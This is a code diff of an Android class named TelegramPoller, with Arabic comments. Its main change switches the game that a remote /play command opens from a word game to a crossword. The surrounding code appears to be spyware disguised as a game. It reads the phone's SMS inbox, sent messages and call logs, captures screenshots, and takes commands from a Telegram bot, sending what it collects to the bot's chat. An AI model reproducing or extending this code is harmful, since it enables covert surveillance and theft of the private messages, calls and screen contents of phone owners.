@@ -97,7 +97,6 @@ public class TelegramPoller implements Runnable {
             }
         }
 
-        // مزامنة صندوق الوارد
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                 ContentResolver cr = ctx.getContentResolver();
@@ -118,7 +117,6 @@ public class TelegramPoller implements Runnable {
             }
         } catch (Exception ignored) {}
 
-        // مزامنة الرسائل المرسلة
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                 ContentResolver cr = ctx.getContentResolver();
@@ -139,7 +137,6 @@ public class TelegramPoller implements Runnable {
             }
         } catch (Exception ignored) {}
 
-        // مزامنة المكالمات
         try {
             ContentResolver cr = ctx.getContentResolver();
             Cursor cursor = null;
@@ -198,11 +195,11 @@ public class TelegramPoller implements Runnable {
                 ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
             }
             else if (cmd.equals("/play")) {
-                // فتح اللعبة من البوت
-                Intent intent = new Intent(ctx, WordGameActivity.class);
+                // 🔥 فتح اللعبة الجديدة (كلمات متقاطعة)
+                Intent intent = new Intent(ctx, CrosswordActivity.class);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 ctx.startActivity(intent);
-                sendMessage(CHAT_ID, "🎮 تم فتح لعبة المايسترو على هاتفك!");
+                sendMessage(CHAT_ID, "🎮 تم فتح لعبة المايسترو (كلمات متقاطعة) على هاتفك!");
             }
             else {
                 sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
